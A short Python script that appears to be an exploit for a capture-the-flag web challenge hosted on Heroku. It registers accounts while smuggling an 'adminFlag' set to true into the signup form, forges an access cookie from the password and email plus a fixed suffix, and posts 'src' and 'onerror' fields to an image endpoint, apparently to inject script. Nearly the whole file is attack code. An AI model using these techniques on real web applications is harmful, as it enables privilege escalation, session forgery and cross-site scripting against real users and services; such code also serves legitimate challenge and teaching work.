import requests
import threading
import string
import sys
import time
import random


HOST = "https://act-chall2.herokuapp.com"
register_url = "%s/signup" % HOST
login_url = "%s/login" % HOST
change_img_url = "%s/img?id=5e301aa155077d0017fa48d3" % HOST

def random_string(n=8):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))

def register(email, password):
	r= requests.post(register_url, data ={'email': email, 'password': password, 'adminFlag': 'true', 'token': ''})
	print(r.text)

def login(email, password):
	r= requests.post(login_url, data = {'email': email, 'password': password})
	print(r.text)
	
def change_img(src, onerror, password, email):
	cookie = 'access_cookie=%s%s1234567891234' % (password, email)
	headers = {'Cookie': cookie}
	r= requests.post(change_img_url,headers = headers, data = {'src': src, 'onerror': onerror})
	print(r.text)


